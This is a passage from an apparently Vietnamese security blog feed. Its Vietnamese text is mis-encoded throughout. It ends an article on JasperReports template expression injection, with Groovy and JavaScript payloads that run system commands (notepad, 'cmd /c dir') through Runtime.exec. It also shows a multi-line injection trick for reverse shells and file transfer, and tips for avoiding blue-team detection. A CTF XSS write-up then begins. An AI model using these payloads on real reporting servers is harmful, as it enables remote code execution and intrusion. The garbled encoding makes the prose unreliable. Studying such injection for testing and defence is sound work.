&lt;/h3&gt;&lt;p&gt;Trong má»™t file JRXML, cÃ³ má»™t thuá»™c tÃ­nh cá»§a tháº» root mÃ  mÃ¬nh chÆ°a Ä‘á» cáº­p Ä‘áº¿n á»Ÿ bÃªn trÃªn, nÃ³ lÃ  &lt;code&gt;language&lt;/code&gt; - tá»©c ngÃ´n ngá»¯ xá»­ lÃ½ cÃ¡c expression xuáº¥t hiá»‡n trong JasperReports. Náº¿u khÃ´ng Ä‘Æ°á»£c khai bÃ¡o thÃ¬ ngÃ´n ngá»¯ máº·c Ä‘á»‹nh sáº½ lÃ  Java (cÅ©ng lÃ  ngÃ´n ngá»¯ mÃ  mÃ¬nh sá»­ dá»¥ng demo á»Ÿ nhá»¯ng pháº§n trÃªn). Tuy nhiÃªn, Jasper há»— trá»£ xá»­ lÃ½ thÃªm 3 loáº¡i ngÃ´n ngá»¯ khÃ¡c, khi Ä‘Æ°á»£c khai bÃ¡o trong &lt;code&gt;language&lt;/code&gt; thÃ¬ chÃºng sáº½ Ä‘Æ°á»£c xá»­ lÃ½ vá»›i compiler tÆ°Æ¡ng á»©ng, Ä‘Ã³ lÃ :&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Groovy: JRGroovyCompiler&lt;/li&gt;
&lt;li&gt;Javascript: JavaScriptCompiler&lt;/li&gt;
&lt;li&gt;BeanShell: JRBshCompiler (ÄÃ£ khÃ´ng cÃ²n há»— trá»£ tá»« Jasper 6.6.0 nÃªn trong pháº¡m vi bÃ i viáº¿t mÃ¬nh sáº½ khÃ´ng Ä‘á» cáº­p Ä‘áº¿n ná»¯a)&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Äiá»u kiá»‡n Ä‘á»ƒ Jasper compile Ä‘Æ°á»£c cÃ¡c ngÃ´n ngá»¯ nÃ y lÃ  há»‡ thá»‘ng cáº§n cÃ³ lib Ä‘á»ƒ xá»­ lÃ½ ngÃ´n ngá»¯ Ä‘Ã³ tÆ°Æ¡ng á»©ng. Vá»›i groovy thÃ¬ sáº½ cáº§n lib: org.apache.groovy -&amp;gt; groovy-all, cÃ²n vá»›i javascript ta sáº½ import thÃªm lib: org.mozilla -&amp;gt; rhino.
Cá»¥ thá»ƒ thÃ¬ mÃ¬nh sá»­ dá»¥ng version sau:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt; 1
&lt;/span&gt;&lt;span class="lnt"&gt; 2
&lt;/span&gt;&lt;span class="lnt"&gt; 3
&lt;/span&gt;&lt;span class="lnt"&gt; 4
&lt;/span&gt;&lt;span class="lnt"&gt; 5
&lt;/span&gt;&lt;span class="lnt"&gt; 6
&lt;/span&gt;&lt;span class="lnt"&gt; 7
&lt;/span&gt;&lt;span class="lnt"&gt; 8
&lt;/span&gt;&lt;span class="lnt"&gt; 9
&lt;/span&gt;&lt;span class="lnt"&gt;10
&lt;/span&gt;&lt;span class="lnt"&gt;11
&lt;/span&gt;&lt;span class="lnt"&gt;12
&lt;/span&gt;&lt;span class="lnt"&gt;13
&lt;/span&gt;&lt;span class="lnt"&gt;14
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-fallback" data-lang="fallback"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&amp;lt;!-- https://mvnrepository.com/artifact/org.codehaus.groovy/groovy-all --&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&amp;lt;dependency&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &amp;lt;groupId&amp;gt;org.codehaus.groovy&amp;lt;/groupId&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &amp;lt;artifactId&amp;gt;groovy-all&amp;lt;/artifactId&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &amp;lt;version&amp;gt;3.0.20&amp;lt;/version&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &amp;lt;type&amp;gt;pom&amp;lt;/type&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&amp;lt;/dependency&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&amp;lt;!-- https://mvnrepository.com/artifact/org.mozilla/rhino --&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&amp;lt;dependency&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &amp;lt;groupId&amp;gt;org.mozilla&amp;lt;/groupId&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &amp;lt;artifactId&amp;gt;rhino&amp;lt;/artifactId&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &amp;lt;version&amp;gt;1.7.14&amp;lt;/version&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&amp;lt;/dependency&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h4 id="groovy"&gt;Groovy
&lt;/h4&gt;&lt;p&gt;Äá»ƒ Jasper sá»­ dá»¥ng groovy lÃ m ngÃ´n ngá»¯ biÃªn dá»‹ch code trong cÃ¡c expression, ta thÃªm property &lt;code&gt;language=&amp;quot;groovy&amp;quot;&lt;/code&gt;, cÅ©ng nhÆ° há»‡ thá»‘ng cÃ³ chá»©a lib há»— trá»£ xá»­ lÃ½ Groovy.
MÃ¬nh vÃ­ dá»¥ má»™t payload cháº¡y lá»‡nh notepad thÃ´ng qua method &lt;code&gt;.execute()&lt;/code&gt; trong groovy:
&lt;img src="https://hackmd.io/_uploads/HkfI_SLnJl.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
LÆ°u Ã½ lÃ  mÃ¬nh khÃ´ng sá»­ dá»¥ng Ä‘Æ°á»£c lá»‡nh println Ä‘á»ƒ in ra káº¿t quáº£ cÃ¢u lá»‡nh, cháº³ng háº¡n nhÆ°: &lt;code&gt;println(&amp;quot;${&amp;quot;cmd /c ver&amp;quot;.execute().text}&amp;quot;&lt;/code&gt; sáº½ hiá»ƒn thá»‹ output cÃ¢u lá»‡nh táº¡i server console, cÃ²n táº¡i PDF ná»™i dung sáº½ lÃ  null:
&lt;img src="https://hackmd.io/_uploads/H1tXtS8n1x.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
&lt;img src="https://hackmd.io/_uploads/rk9HtBI3yg.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
NgoÃ i viá»‡c thá»±c hiá»‡n lá»‡nh, mÃ¬nh cÅ©ng cÃ³ thá»ƒ ghi file náº¿u nhÆ° biáº¿t Ä‘Æ°á»ng dáº«n báº±ng &lt;code&gt;newFile(&amp;quot;path/to/shell&amp;quot;).write('1337')&lt;/code&gt;, hoáº·c nhiá»u cÃ¡c tÃ¡c vá»¥ file khÃ¡c. MÃ¬nh nghÄ© nÃªn dÃ¹ng cÃ¡c native syntax code cá»§a tá»«ng ngÃ´n ngá»¯ thay vÃ¬ thá»±c thi cÃ¢u lá»‡nh Ä‘á»ƒ trÃ¡nh viá»‡c bá»‹ bÃªn blue phÃ¡t hiá»‡n sá»›m (náº¿u cÃ³).&lt;/p&gt;
&lt;h4 id="javascript"&gt;Javascript
&lt;/h4&gt;&lt;p&gt;Báº£n thÃ¢n javascript khÃ´ng cÃ³ native syntax Ä‘á»ƒ execute command, nÃªn mÃ¬nh sáº½ lá»£i dá»¥ng kháº£ nÄƒng gá»i Java trong javascript Ä‘á»ƒ call cÃ¡c package thÃ´ng qua syntax &lt;code&gt;Packages&lt;/code&gt;, cÃ¡i nÃ y khÃ¡ há»¯u Ã­ch khi bÃªn há» cháº·n theo kiá»ƒu blacklist 1 chuá»—i method &lt;code&gt;Runtime.getRuntime().exec()&lt;/code&gt; hoáº·c tÆ°Æ¡ng tá»±.
LÆ°u Ã½ lÃ  má»™t textField sáº½ chá»‰ cÃ³ thá»ƒ in ra ná»™i dung trÃªn 1 dÃ²ng nÃªn háº§u háº¿t nhá»¯ng cÃ¢u lá»‡nh trÃªn mÃ¬nh hay demo báº±ng whoami, Ä‘á»ƒ láº¥y Ä‘Æ°á»£c nhiá»u input hÆ¡n, mÃ¬nh sáº½ sá»­ dá»¥ng thÃªm attribute &lt;code&gt;isStretchWithOverflow=&amp;quot;true&amp;quot;&lt;/code&gt; Ä‘á»ƒ Jasper tá»± Ä‘á»™ng kÃ©o dÃ i textField cho mÃ¬nh, náº¿u khÃ´ng cÃ³ attribute Ä‘Ã³ Jasper chá»‰ in ra 1 dÃ²ng Ä‘áº§u tiÃªn cá»§a output command.
Náº¿u sá»­ dá»¥ng javascript ta cÃ³ thá»ƒ thoáº£i mÃ¡i sá»­ dá»¥ng ; Ä‘á»ƒ chÃ¨n nhiá»u cÃ¢u lá»‡nh, mÃ¬nh vÃ­ dá»¥ má»™t Ä‘oáº¡n code ngáº¯n Ä‘á»ƒ láº¥y háº¿t output cÃ¢u lá»‡nh &lt;code&gt;dir&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt; 1
&lt;/span&gt;&lt;span class="lnt"&gt; 2
&lt;/span&gt;&lt;span class="lnt"&gt; 3
&lt;/span&gt;&lt;span class="lnt"&gt; 4
&lt;/span&gt;&lt;span class="lnt"&gt; 5
&lt;/span&gt;&lt;span class="lnt"&gt; 6
&lt;/span&gt;&lt;span class="lnt"&gt; 7
&lt;/span&gt;&lt;span class="lnt"&gt; 8
&lt;/span&gt;&lt;span class="lnt"&gt; 9
&lt;/span&gt;&lt;span class="lnt"&gt;10
&lt;/span&gt;&lt;span class="lnt"&gt;11
&lt;/span&gt;&lt;span class="lnt"&gt;12
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-gdscript3" data-lang="gdscript3"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="k"&gt;var&lt;/span&gt; &lt;span class="n"&gt;r&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;Packages&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;java&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;lang&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Runtime&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="k"&gt;var&lt;/span&gt; &lt;span class="n"&gt;p&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;getRuntime&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;exec&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;cmd /c dir&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="k"&gt;var&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;Packages&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;java&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;io&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;InputStreamReader&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;getInputStream&lt;/span&gt;&lt;span class="p"&gt;());&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="k"&gt;var&lt;/span&gt; &lt;span class="n"&gt;b&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;Packages&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;java&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;io&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;BufferedReader&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="k"&gt;var&lt;/span&gt; &lt;span class="n"&gt;line&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="k"&gt;var&lt;/span&gt; &lt;span class="n"&gt;output&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="k"&gt;while&lt;/span&gt; &lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="n"&gt;line&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;b&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;readLine&lt;/span&gt;&lt;span class="p"&gt;())&lt;/span&gt; &lt;span class="o"&gt;!==&lt;/span&gt; &lt;span class="n"&gt;null&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;output&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="n"&gt;line&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;b&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;close&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;waitFor&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;output&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Táº¡i PDF mÃ¬nh Ä‘Ã£ cÃ³ thá»ƒ láº¥y háº¿t Ä‘c output cÃ¢u lá»‡nh:
&lt;img src="https://hackmd.io/_uploads/ryswnUIhyg.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;&lt;/p&gt;
&lt;h3 id="multi-line-code-injection"&gt;Multi-line Code Injection
&lt;/h3&gt;&lt;p&gt;Náº¿u nhÆ° cÃ¡c báº¡n Ä‘á»ƒ Ã½ thÃ¬ khi chÃ¨n Java vÃ  Groovy code thÃ¬ háº§u nhÆ° mÃ¬nh luÃ´n Æ°u tiÃªn dÃ¹ng one-line code, bá»Ÿi vÃ¬ Ä‘Ã´i khi sá»­ dá»¥ng dáº¥u &lt;code&gt;;&lt;/code&gt; thÃ¬ sáº½ xáº£y ra lá»—i thá»±c thi, lÃºc trÆ°á»›c mÃ¬nh chÆ°a hiá»ƒu táº¡i sao nÃªn cÅ©ng táº¡m thá»i bá» qua mÃ  sá»­ dá»¥ng one-line code.
Tuy nhiÃªn, viá»‡c chÃ¨n nhiá»u hÆ¡n 1 cÃ¢u lá»‡nh sáº½ cáº§n thiáº¿t náº¿u nhÆ° ta muá»‘n sá»­ dá»¥ng native code Ä‘á»ƒ thá»±c hiá»‡n reverse shell, download file, upload file,&amp;hellip; thay vÃ¬ cháº¡y lá»‡nh há»‡ thá»‘ng. NÃªn mÃ¬nh cÅ©ng ngá»“i mÃ y mÃ² debug Ä‘á»ƒ náº¯m rÃµ váº¥n Ä‘á».&lt;/p&gt;
&lt;h4 id="java"&gt;Java
&lt;/h4&gt;&lt;p&gt;MÃ¬nh sáº½ truyá»n vÃ o &lt;code&gt;1337;;;&lt;/code&gt; táº¡i textFieldExpression Ä‘á»ƒ thá»­ Ä‘Ã£.
Vá»›i cáº£ 2 ngÃ´n ngá»¯, viá»‡c expression Ä‘Æ°á»£c biáº¿n thÃ nh source code nhÆ° tháº¿ nÃ o nÃ o sáº½ náº±m táº¡i method &lt;code&gt;compileReport&lt;/code&gt;, mÃ¬nh Ä‘áº·t breakpoint tá»« nÃ³ Ä‘á»ƒ debug:
&lt;img src="https://hackmd.io/_uploads/SkcsJvU31e.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
Tá»« JasperCompileManager#compileReport, Jasper kiá»ƒm tra ngÃ´n ngá»¯ Ä‘á»ƒ chá»n Ä‘Ãºng Compiler cho report. VÃ¬ Ä‘Ã¢y lÃ  Java nÃªn Jasper sáº½ sá»­ dá»¥ng JRJdtCompiler#generateSourceCode
&lt;img src="https://hackmd.io/_uploads/HJFklPIhJg.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
Tiáº¿p tá»¥c call Ä‘áº¿n JRClassGenerator#generateClass, cÃ¡c method vÃ  param sáº½ Ä‘Æ°á»£c thiáº¿t láº­p táº¡i Ä‘Ã¢y báº±ng má»™t loáº¡t cÃ¡c method generate:
&lt;img src="https://hackmd.io/_uploads/ry6bgPLn1g.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
Nháº£y vÃ o JRClassGenerator#generateMethod, mÃ¬nh Ä‘Ã£ tháº¥y nÆ¡i xá»­ lÃ½ code cÃ³ trong expression, Ä‘Ã³ lÃ  thÃ´ng qua method JRClassGenerator#writeExpression
&lt;img src="https://hackmd.io/_uploads/S1SBeDInkg.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
CÃ¢u lá»‡nh cá»§a mÃ¬nh Ä‘Æ°á»£c Ä‘Æ°a vÃ o lá»‡nh case, vá»›i sá»‘ case Ä‘Æ°á»£c láº¥y tá»« expression Id, cÃ²n giÃ¡ trá»‹ thÃ¬ ná»‘i chuá»—i vá»›i Ä‘oáº¡n code &lt;code&gt;value = ...&lt;/code&gt;, sau Ä‘Ã³ break ra ngoÃ i
&lt;img src="https://hackmd.io/_uploads/SyRFgPU2yx.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
Náº¿u váº­y thÃ¬ vá»›i Java Ä‘á»ƒ chÃ¨n thÃªm code mÃ¬nh nghÄ© khÃ¡ Ä‘Æ¡n giáº£n, chá»‰ cáº§n Ä‘Æ°a cho value má»™t chuá»—i ban Ä‘áº§u rá»“i xuá»‘ng dÃ²ng viáº¿t tiáº¿p lá»‡nh lÃ  Ä‘Æ°á»£c:
&lt;img src="https://hackmd.io/_uploads/S1ylEvU31x.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;&lt;/p&gt;
&lt;h4 id="groovy-1"&gt;Groovy
&lt;/h4&gt;&lt;p&gt;Tuy nhiÃªn khi sá»­ dá»¥ng cÃ¡ch Ä‘Ã³ vá»›i groovy thÃ¬ khÃ´ng thÃ nh cÃ´ng:
&lt;img src="https://hackmd.io/_uploads/BkT8qvLnJg.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
Äiá»ƒm khÃ¡c biá»‡t náº±m táº¡i JRGroovyGenerator#writeExpression, lÃºc nÃ y code Ä‘Æ°á»£c Ä‘Æ°a vÃ o &lt;code&gt;value = (&lt;/code&gt; vÃ  Ä‘á»“ng thá»i cÃ³ má»™t dáº¥u &lt;code&gt;);&lt;/code&gt; káº¿t thÃºc trong cÃ¢u lá»‡nh &lt;code&gt;if&lt;/code&gt;, cÃ¢u lá»‡nh bá»‹ lá»—i do mÃ¬nh chÆ°a Ä‘Ã³ng ngoáº·c value láº¡i:
&lt;img src="https://hackmd.io/_uploads/BJ0cqPL3kx.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
Äá»ƒ cháº¡y Ä‘Æ°á»£c multi-line á»Ÿ groovy, mÃ¬nh cáº§n thÃªm &lt;code&gt;);&lt;/code&gt; sau chuá»—i, Ä‘á»“ng thá»i comment láº¡i dáº¥u &lt;code&gt;);&lt;/code&gt; Ä‘áº±ng sau Ä‘á»ƒ khÃ´ng trigger lá»—i syntax:
&lt;img src="https://hackmd.io/_uploads/ryDkhvUnJg.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
&lt;img src="https://hackmd.io/_uploads/ry3e3vInkg.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;&lt;/p&gt;
&lt;p&gt;=&amp;gt; Khi sá»­ dá»¥ng multi-line code táº¡i Java vÃ  Groovy, ta Ä‘Ã£ ngáº¯t cÃ¢u lá»‡nh value tá»©c giÃ¡ trá»‹ tráº£ vá» cá»§a textFeild lÃ  chuá»—i táº¡i dÃ²ng Ä‘áº§u tiÃªn, nÃªn Ä‘á»ƒ láº¥y Ä‘Æ°á»£c output, mÃ¬nh sáº½ cáº§n pháº£i set láº¡i giÃ¡ trá»‹ cho biáº¿n value bÃªn trÃªn.
VÃ­ dá»¥ táº¡i Java, mÃ¬nh sáº½ gÃ¡n láº¡i giÃ¡ trá»‹ cho value báº±ng output cÃ¢u lá»‡nh &lt;code&gt;cmd /c ver&lt;/code&gt;:
&lt;img src="https://hackmd.io/_uploads/H13NuO8nJe.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
&lt;img src="https://hackmd.io/_uploads/Byde__Inyx.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
TÆ°Æ¡ng tá»± vá»›i Groovy, mÃ¬nh gÃ¡n láº¡i output cá»§a def cmd vÃ o lÃ  cÃ³ thá»ƒ láº¥y háº¿t output:
&lt;img src="https://hackmd.io/_uploads/Bya-tOIhkx.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
&lt;img src="https://hackmd.io/_uploads/r1M4tdI3yx.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;&lt;/p&gt;
&lt;h2 id="káº¿t-luáº­n"&gt;Káº¿t luáº­n
&lt;/h2&gt;&lt;p&gt;TÃ¹y vÃ o tÃ¬nh hÃ¬nh cá»¥ thá»ƒ cá»§a há»‡ thá»‘ng mÃ  mÃ¬nh sáº½ Ä‘Æ°a ra lá»±a chá»n nÃªn táº¥n cÃ´ng theo cÃ¡ch bypass nÃ o. CÅ©ng nhÆ° cÃ³ thá»ƒ káº¿t há»£p viá»‡c sá»­ dá»¥ng ngÃ´n ngá»¯ khÃ¡c vÃ  tháº» láº¡ Ä‘á»ƒ da dáº¡ng hÃ³a cÃ¡ch thá»©c táº¥n cÃ´ng, khiáº¿n cho viá»‡c truy váº¿t trá»Ÿ nÃªn khÃ³ khÄƒn hÆ¡n. MÃ¬nh mong bÃ i viáº¿t cá»§a mÃ¬nh sáº½ cung cáº¥p cho má»i ngÆ°á»i nhá»¯ng kiáº¿n thá»©c tá»•ng quan vá» Jasper, tá»« Ä‘Ã³ cÃ³ thá»ƒ tÃ¬m Ä‘Æ°á»£c thÃªm nhiá»u kiá»ƒu bypass khÃ¡c ná»¯a.
Hiá»‡n táº¡i mÃ¬nh chÆ°a tháº¥y cÃ³ cÃ¡ch nÃ o Ä‘á»ƒ phÃ²ng trÃ¡nh triá»‡t Ä‘á»ƒ lá»—i nÃ y, nÃªn cÃ¡c developer khi sá»­ dá»¥ng JasperReports cáº§n chÃº Ã½ háº¡n cháº¿ tá»‘i Ä‘a cho ngÆ°á»i dÃ¹ng Ä‘Æ°á»£c chá»‰nh sá»­a cÃ¡c thÃ nh pháº§n trong template, chá»‰ sá»­ dá»¥ng khung template cÃ³ sáºµn.&lt;/p&gt;
&lt;h2 id="references"&gt;References
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;a class="link" href="https://jasperreports.sourceforge.net/JasperReports-Ultimate-Guide-3.pdf" target="_blank" rel="noopener"
&gt;https://jasperreports.sourceforge.net/JasperReports-Ultimate-Guide-3.pdf&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class="link" href="https://www.cnblogs.com/snad/p/17566075.html" target="_blank" rel="noopener"
&gt;https://www.cnblogs.com/snad/p/17566075.html&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class="link" href="https://gist.github.com/v-p-b/dd95c72c6924dc1338e78e9d380bd388" target="_blank" rel="noopener"
&gt;https://gist.github.com/v-p-b/dd95c72c6924dc1338e78e9d380bd388&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class="link" href="https://insinuator.net/2023/06/jasper-reports-library-code-injection/" target="_blank" rel="noopener"
&gt;https://insinuator.net/2023/06/jasper-reports-library-code-injection/&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description></item><item><title>Pwnme Phreaks CTF 2025 write up</title><link>https://kev1n1203.github.io/p/pwnme-phreaks-2025/</link><pubDate>Mon, 03 Mar 2025 00:00:00 +0000</pubDate><guid>https://kev1n1203.github.io/p/pwnme-phreaks-2025/</guid><description>&lt;p&gt;Sau má»™t thÃ¡ng lu bu viá»‡c há»c, viá»‡c táº¿t, viá»‡c lÃ m&amp;hellip; MÃ¬nh bá» bÃª CTF khÃ¡ lÃ¢u mÃ  khÃ´ng thá»±c sá»± chÃº tÃ¢m vÃ o nÃ³. Nay mÃ¬nh má»›i láº­t Ä‘áº­t ngá»“i lÃ m cÃ¡c bÃ i táº¡i giáº£i pwnme phreaks,&amp;hellip; MÃ¬nh Ä‘á»™ng vÃ o 3 bÃ i, tuy nhiÃªn lÃ  cÃ³ 1 bÃ i blackbox mÃ  giáº£i end há» Ä‘Ã³ng luÃ´n website nÃªn Ä‘Ã nh chá»‹u &lt;code&gt;Â¯\_(ãƒ„)_/Â¯&lt;/code&gt;. Sau Ä‘Ã¢y lÃ  write up cá»§a mÃ¬nh vá»›i 2 chall whitebox mÃ  mÃ¬nh chÆ°a ká»‹p sol trong thá»i gian giáº£i diá»…n ra.&lt;/p&gt;
&lt;h2 id="say-my-name"&gt;Say My Name
&lt;/h2&gt;&lt;p&gt;Má»™t challenge code báº±ng python vá»›i source code ngáº¯n, Ã½ tÆ°á»Ÿng khÃ¡ trá»±c quan. Vá»«a má»Ÿ code, mÃ¬nh Ä‘Ã£ tháº¥y &lt;code&gt;bot.py&lt;/code&gt; (damn, láº¡i XSS)
&lt;br&gt;&lt;img src="https://hackmd.io/_uploads/B1N94yXikg.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;&lt;/p&gt;
&lt;h3 id="xss-with-csrf"&gt;XSS with CSRF
&lt;/h3&gt;&lt;p&gt;Khi render template python Ä‘á»ƒ dÃ­nh XSS thÃ¬ ta cáº§n cÃ³ option &lt;code&gt;|safe&lt;/code&gt; trong expression, mÃ¬nh Ä‘i tÃ¬m trong code thÃ¬ chá»‰ cÃ³ giÃ¡ trá»‹ name trong &lt;code&gt;templates/yourname.html&lt;/code&gt; lÃ  dÃ­nh:
&lt;br&gt;&lt;img src="https://hackmd.io/_uploads/HyhwIymikg.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
NÃ³ náº±m trong má»™t dáº¥u nhÃ¡y kÃ©p cá»§a document.location vÃ  trong tiáº¿p thuá»™c tÃ­nh onfocus cá»§a tháº» &lt;code&gt;&amp;lt;a&amp;gt;&lt;/code&gt;
